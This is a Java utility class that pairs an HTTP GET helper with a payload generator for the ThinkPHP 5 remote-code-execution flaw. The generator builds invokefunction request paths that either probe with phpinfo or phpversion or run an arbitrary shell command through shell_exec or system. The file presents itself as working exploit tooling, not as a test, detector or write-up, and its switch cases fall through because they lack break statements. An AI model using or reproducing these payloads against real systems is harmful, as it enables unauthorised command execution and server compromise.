package com.example.test5;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.TimeUnit;

public class HttpUtils {
    private static final int CONNECTION_TIMEOUT = 5000;
    private static final int SOCKET_TIMEOUT = 5000;

    public static String executeGetRequest(String url) throws IOException {
        HttpURLConnection connection = null;
        try {
            URL target = new URL(url);
            connection = (HttpURLConnection) target.openConnection();
            connection.setInstanceFollowRedirects(false);
            connection.setRequestMethod("GET");
            connection.setConnectTimeout(CONNECTION_TIMEOUT);
            connection.setReadTimeout(SOCKET_TIMEOUT);

            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                try (BufferedReader in = new BufferedReader(
                        new InputStreamReader(connection.getInputStream()))) {
                    StringBuilder response = new StringBuilder();
                    String inputLine;
                    while ((inputLine = in.readLine()) != null) {
                        response.append(inputLine).append("\n");
                    }
                    return response.toString();
                }
            } else {
                throw new IOException("HTTP Error: " + responseCode);
            }
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
    }

    public static String generatePayload(String poc, String type, String command) {
        switch (poc) {
            case "thinkphp5":
                if ("vulnerability".equals(type)) {
                    return "/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1";
                } else if ("command".equals(type)) {
                    return "/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]="
                            + command;
                }
            case "thinkphp5.0.23":
                if ("vulnerability".equals(type)) {
                    return "/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpversion&vars[1][]=1";
                } else if ("command".equals(type)) {
                    return "/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]="
                            + command;
                }
            default:
                throw new IllegalArgumentException("Unsupported PoC type: " + poc);
        }
    }
}
